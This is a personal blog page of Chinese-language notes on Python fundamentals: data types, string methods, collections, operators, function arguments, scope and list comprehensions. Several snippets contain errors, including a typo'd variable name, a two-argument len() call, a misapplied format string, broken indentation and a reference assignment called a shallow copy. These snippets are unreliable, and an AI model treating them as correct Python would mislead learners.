<h2 id="一类-基础语法"><a href="#一类-基础语法" class="headerlink" title="一类 基础语法"></a>一类 基础语法</h2><h4 id="python2-与-python3-区别"><a href="#python2-与-python3-区别" class="headerlink" title="python2 与 python3 区别"></a>python2 与 python3 区别</h4><pre><code>输入输出：
        python2 : raw_input() / input()            print &quot;hello&quot;
        python3 : input()                    print (&quot;hello&quot;)
数字类型：
        python2 没有布尔型，数字0表示False，数字1表示True
        python3 中True和False定义成关键字，但值还是1，0，可以和数字相加
</code></pre><h4 id="常用格式化："><a href="#常用格式化：" class="headerlink" title="常用格式化："></a>常用格式化：</h4><pre><code>tpl = &quot;i am %s&quot; % &quot;alex&quot;
tpl = &quot;i am %s age %d&quot; % (&quot;alex&quot;, 18)
tpl = &quot;i am %(name)s age %(age)d&quot; % {&quot;name&quot;: &quot;alex&quot;, &quot;age&quot;:18}
tpl = &quot;percent %.2f&quot; % 99.97623
tpl = &quot;i am %(pp).2f&quot; % {&quot;pp&quot;: 123.425556, }
tpl = &quot;i am %.2f %%&quot; % {&quot;pp&quot;: 123.425556, }
</code></pre><h4 id="python中常见字符串处理函数："><a href="#python中常见字符串处理函数：" class="headerlink" title="python中常见字符串处理函数："></a>python中常见字符串处理函数：</h4><pre><code>string.capitalize()     // 把字符串的第一个字符大写    
string.decode(encoding=&apos;UTF-8&apos;, errors=&apos;strict&apos;)    // 以 encoding 指定的编码格式解码 string，如果出错默认报一个 ValueError 的 异 常 ， 除非 errors 指 定 的 是 &apos;ignore&apos; 或 者&apos;replace&apos;
string.encode(encoding=&apos;UTF-8&apos;, errors=&apos;strict&apos;)    // 以 encoding 指定的编码格式编码 string，如果出错默认报一个ValueError 的异常，除非 errors 指定的是&apos;ignore&apos;或者&apos;replace&apos;
string.find(str, beg=0, end=len(string))          // 检测 str 是否包含在 string 中，如果 beg 和 end 指定范围，则检查是否包含在指定范围内，如果是返回开始的索引值，否则返回-1            
string.format()        // 格式化字符串
string.lstrip()          // 去除字符串左边的空格
string.rstrip()          // 去除字符串右边的空格
string.strip()           // 去除字符串两边的空格    
string.replace(str1, str2, num=string.count(str1))      // 把 string 中的 str1 替换成 str2,如果 num 指定，则替换不超过 num 次
</code></pre><h4 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h4><pre><code>list1=[&quot;how&quot;,&quot;are&quot;]
list2=[&quot;you&quot;,&quot;?&quot;]

print (list1[0])              #读取列表中第一个元素
print (list1[0:2])              #从第一个元素开始截取列表 截取个数为2  
print (list2*2)                  #将列表中元素重复
print (lis t1+list2)          #列表中数据组合
list1.append(&quot;hello&quot;)         #在列表最后添加新的元素
print (list1)        
del(list1[2])                  #删除索引为2的元素
print (list1)
list3=&quot;fine&quot;
print (list(list3))              #输出[&apos;f&apos;, &apos;i&apos;, &apos;n&apos;, &apos;e&apos;]
list4=(&quot;asd&quot;,&quot;ds&quot;,&quot;qw&quot;)
print (list(list4))              #将元素转换为列表
</code></pre><h4 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h4><pre><code>注: 元组中元素值不允许被修改，但可对其进行连接组合，生成新的元组
元组创建方法：
tup1 = (&apos;physics&apos;, &apos;chemistry&apos;, 1997, 2000)
tup2 = (1, 2, 3, 4, 5 )
tup3 = &quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;
tup4=(&quot;a&quot;,)                   #元组中只包含一个元素时，需要在元素后面添加逗号

tuple(tup)              #将列表转换为元祖
cmp(tuple1, tuple2)           #比较的元素是同类型的,则比较其值,返回结果；两个元素不是同一种类型,则检查它们是否是数字，如果是数字,执行必要的数字强制类型转换,然后比较。如果有一方的元素是数字,则另一方的元素&quot;大&quot;(数字是&quot;最小的&quot;) 。否则,通过类型名字的字母顺序进行比较
len(tuple1, tuple2)           #计算元组元素个数
max(tuple)                    #返回元组中元素最大值
min(tuple)                    #返回元组中元素最小值
del tup;                      #删除元组
</code></pre><h4 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h4><pre><code>内置函数
    列表是有序的对象集合，字典是无序的对象集合
    键一般是唯一的，如果重复最后的一个键值对会替换前面的，值不需要唯一
    值可以取任何数据类型，但键必须是不可变的，如字符串，数字或元组
  d={key1:value1,key2:values}
  cmp(dict1, dict2)     #字典元素相同则返回0，如果dict1大于dict2返回1，如果字典dict1小于字典dict2返回-1
  len(dict)             #返回字典的元素个数，即键的总数
  str(dict)             #返回字符串
  type(dict)            #返回输入的变量类型

内置方法
   dict.clear()      #删除字典内所有元素
   dict.copy()       #返回一个字典的浅复制
        实例：
          d={&quot;zhang&quot;:123,&quot;liu&quot;:456,&quot;zhao&quot;:789}
          d1=d.copy()    # 浅拷贝：深拷贝父对象（一级目录），子对象（二级目录）不拷贝，还是引用
          d2=d         # 浅拷贝: 引用对象
          print (d1)    #输出 {&apos;zhang&apos;: 123, &apos;liu&apos;: 456, &apos;zhao&apos;: 789}
          print (d2)    #输出 {&apos;zhang&apos;: 123, &apos;liu&apos;: 456, &apos;zhao&apos;: 789}
          d[&quot;zhang&quot;]=111
          print (d1)    #输出 {&apos;zhang&apos;: 123, &apos;liu&apos;: 456, &apos;zhao&apos;: 789}
          print (d2)    #输出 {&apos;zhang&apos;: 111, &apos;liu&apos;: 456, &apos;zhao&apos;: 789}
</code></pre><h4 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h4><pre><code>注：创建一个空集合必须用 set() 而不是 { }，因为 { } 是用来创建一个空字典。 
s.add( x )         #将元素 x 添加到集合 s 中，如果元素已存在，则不进行任何操作
s.remove( x )      #将元素 x 添加到集合 s 中移除，如果元素不存在，则会发生错误
s.discard( x )     #移除集合中的元素，且如果元素不存在，不会发生错误
s.pop()            #随机删除集合中的一个元素
s.clear()          #清空集合s
len(s)             #计算集合 s 元素个数
x in s             #判断元素 s 是否在集合 x 中存在，存在返回 True，不存在返回 False
</code></pre><h5 id="python-位运算符"><a href="#python-位运算符" class="headerlink" title="python 位运算符"></a>python 位运算符</h5><pre><code>a = 0011 1100
b = 0000 1101

a&amp;b = 0000 1100       # 按位与运算符：参与运算的两个值,如果两个相应位都为1,则该位的结果为1,否则为0
a|b = 0011 1101       # 按位或运算符：只要对应的二个二进位有一个为1时，结果位就为1。
a^b = 0011 0001       # 按位异或运算符：当两对应的二进位相异时，结果为1 
~a  = 1100 0011      # 按位取反运算符：对数据的每个二进制位取反,即把1变为0,把0变为1。~x 类似于 -x-1
</code></pre><h5 id="python-逻辑运算符"><a href="#python-逻辑运算符" class="headerlink" title="python 逻辑运算符"></a>python 逻辑运算符</h5><pre><code>x and y   # 布尔&quot;与&quot; - 如果 x 为 False，x and y 返回 False，否则它返回 y 的计算值 
x or y      # 布尔&quot;或&quot; - 如果 x 是 True，它返回 x 的值，否则它返回 y 的计算值
not x     # 布尔&quot;非&quot; - 如果 x 为 True，返回 False 。如果 x 为 False，它返回 True
</code></pre><h5 id="python-传不可变对象实例"><a href="#python-传不可变对象实例" class="headerlink" title="python 传不可变对象实例"></a>python 传不可变对象实例</h5><pre><code>def ChangeInt( a ):
        a = 10
b = 2
ChangeInt(b)
print( b )             # 结果是 2

实例中有 int 对象 2，指向它的变量是 b，在传递给 ChangeInt 函数时，按传值的方式复制了变量 b，a 和 b 都指向了同一个 Int 对象，在 a=10 时，则新生成一个 int 值对象 10，并让 a 指向它
</code></pre><h5 id="传可变对象实例"><a href="#传可变对象实例" class="headerlink" title="传可变对象实例"></a>传可变对象实例</h5><pre><code># 定义可修改函数
def changeme( mylist ):
   mylist.append([1,2,3,4])
   print (&quot;函数内取值: &quot;, mylist)  输出 函数内取值:  [10, 20, 30, [1, 2, 3, 4]]
   return

# 调用changeme函数
mylist = [10,20,30]
changeme( mylist )
print (&quot;函数外取值: &quot;, mylist)    #输出 函数外取值:  [10, 20, 30, [1, 2, 3, 4]]
</code></pre><h5 id="不定长参数"><a href="#不定长参数" class="headerlink" title="不定长参数"></a>不定长参数</h5><ul>
<li><p>加了星号 * 的参数会以元组(tuple)的形式导入，存放所有未命名的变量参数</p>
<pre><code>实例：
    def printinfo( arg1, *vartuple ):
    print (arg1)           
    print (vartuple)      
printinfo( 70, 60, 50 )       # 输出     70
                              #        （60,50）
</code></pre></li>
<li><p>加了两个星号 ** 的参数会以字典的形式导入</p>
<pre><code>实例：
   def printinfo( arg1, **vardict ):
   print (arg1)
   print (vardict)
printinfo(1, a=2,b=3)      # 输出   1
                           #       {&apos;a&apos;: 2, &apos;b&apos;: 3}
</code></pre></li>
</ul>
<h5 id="变量作用域"><a href="#变量作用域" class="headerlink" title="变量作用域"></a>变量作用域</h5><pre><code>Python的作用域一共有4种
    L （Local） 局部作用域
    E （Enclosing） 闭包函数外的函数中
    G （Global） 全局作用域
    B （Built-in） 内建作用域
以 L –&gt; E –&gt; G –&gt;B 的规则查找，即：在局部找不到，便会去局部外的局部找（例如闭包），再找不到就会去全局找，再者去内建中找
x = int(2.9)  # 内建作用域
g_count = 0  # 全局作用域
def outer():
    o_count = 1  # 闭包函数外的函数中
    def inner():
        i_count = 2  # 局部作用域
</code></pre><h5 id="nonlocal-关键字"><a href="#nonlocal-关键字" class="headerlink" title="nonlocal 关键字"></a>nonlocal 关键字</h5><ul>
<li><p>nonlocal适用于嵌套函数中内部函数修改外部变量的值</p>
<pre><code>实例：
 def outer():
       num = 10
       def inner():
           nonlocal num   # nonlocal关键字声明
           num = 100
           print(num)     #输出 100
        inner() 
        print(num)       #输出 100
 outer()
</code></pre></li>
</ul>
<h5 id="列表推导式"><a href="#列表推导式" class="headerlink" title="列表推导式"></a>列表推导式</h5><ul>
<li><p>实例1</p>
<pre><code>l=[&quot;   ho w&quot;,&quot;   are   &quot;,&quot;you   &quot;]
print ([l1.strip() for l1 in l])      #输出 [&apos;ho w&apos;, &apos;are&apos;, &apos;you&apos;]
</code></pre></li>
<li><p>实例2：</p>
<pre><code>l=[123,45,3]
print ([l1*2 for l1 in l if l1 &gt; 2])    #输出 [246, 90, 6]
</code></pre></li>
<li><p>实例3</p>
<pre><code>l1=[1,2,3]
l2=[11,12,13]
l3=[x*y for x in l1 for y in l2]
print (l3)        #输出 [11, 12, 13, 22, 24, 26, 33, 36, 39]
</code></pre></li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">wcute</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">25</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">6</span>
                  <span class="site-state-item-name">categories</span>
                </a>
              </div>
            

            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">wcute</span>

  
</div>


  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
